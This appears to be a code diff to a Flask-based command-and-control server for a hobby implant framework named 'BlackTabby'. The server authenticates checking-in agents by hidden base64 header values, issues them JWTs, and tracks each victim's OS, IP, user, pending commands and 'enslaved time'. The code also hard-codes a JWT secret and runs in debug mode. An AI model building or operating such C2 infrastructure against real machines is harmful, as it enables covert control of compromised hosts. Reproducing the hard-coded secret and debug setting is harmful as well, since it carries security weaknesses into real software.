@@ -5,13 +5,13 @@ from flask_jwt_extended import (
 )
 import json
 import sys
+import couchdb
+
 
 app = Flask(__name__)
 
 app.config['JWT_SECRET_KEY'] = 'dawoof7123'
 jwt = JWTManager(app)
-
-
 
 @app.route('/first_check_in', methods = ['POST'])
 def first_checkin():
@@ -19,20 +19,30 @@ def first_checkin():
 	headers = request.headers
 	print(headers)
 	if not request.is_json:
-		return jsonify({"msg":"missing json content type...exiting"})
+		return jsonify({"Error":"Unauthorized"})
+	print
+	if headers.get("User-Agent") != "QmxhY2tUYWJieQo=": ### BlackTabby Base64 Encoded
+		return jsonify({"Error":"Unauthorized"})
+	if headers.get("Agent") != "TGVhcm5pbmdDVG9CRWxpdGUK": ###Base64 LearningCToBElite
+		return jsonify({"Error":"Unauthorized"})
+	## gather parameters from json ##
+	try:
+	  content = request.get_json()
+	  agent_id = content['agent_id']
+	  os = content['os']
+	  ip = content['ip']
+	  user = content['user']
+	  token = generate_token(agent_id)
+	  return jsonify(access_token=token)
+	except:
+	  return jsonify({"Error":"Missing Parameters"})
 
 
-
-
-
-def auth(username,password):
-	print("auth")
-	'''
-	if password == "whatever":
-	print("authenicate then give JWT token")
-	access_token = create_access_token(identity=username)
-    return jsonify(access_token=access_token), 200
-    '''
+def generate_token(agent_id):
+	print("the function that actually generates the json token")
+	access_token = create_access_token(identity=agent_id)
+	print(access_token)
+	return access_token
 
 
 
@@ -73,3 +83,21 @@ def polling():
 
 app.run(debug=True,port=9000)
 #ssl_context='adhoc'
+
+
+
+
+
+
+
+
+# json format always
+'''
+    	agent_id: int
+    	OS: str
+    	ip: str
+    	user: str
+    	completed_commands: list
+  	  	pending_commands:list
+    	enslaved_time: datetime 
+  '''
